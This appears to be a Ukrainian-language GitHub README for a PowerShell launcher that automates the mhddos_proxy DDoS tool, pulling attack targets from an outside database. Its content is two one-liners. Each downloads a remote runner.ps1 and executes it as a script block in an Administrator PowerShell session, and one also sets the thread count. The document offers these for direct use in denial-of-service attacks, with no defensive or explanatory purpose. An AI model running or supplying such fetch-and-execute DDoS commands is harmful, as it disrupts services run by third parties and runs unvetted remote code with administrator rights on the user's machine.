# mhddos_powershell

Скрипт автоматизує роботу mhddos_proxy, автоматично підтягує цілі з бази даних Українського женця. 

Вимоги:

  Скрипт потребує тільки встановленої Windows 7 або новішої версії. Встановлення додаткового ПЗ не потрібно.

Запуск (Команда виконується в терміналі PowerShell з правами Адміністратора):

```powershell
[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls"; $ScriptBlock = [scriptblock]::Create((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/mErlin-sp/mhddos_powershell/master/runner.ps1')); Invoke-Command -ScriptBlock $ScriptBlock -ArgumentList ''
```
  
Після --ArgumentList є можливість вказати будь-які параметри для mhddos_proxy. Наприклад, вкажемо кількість потоків 100:
  
```powershell
[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls"; $ScriptBlock = [scriptblock]::Create((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/mErlin-sp/mhddos_powershell/master/runner.ps1')); Invoke-Command -ScriptBlock $ScriptBlock -ArgumentList '-t 100'
```
  
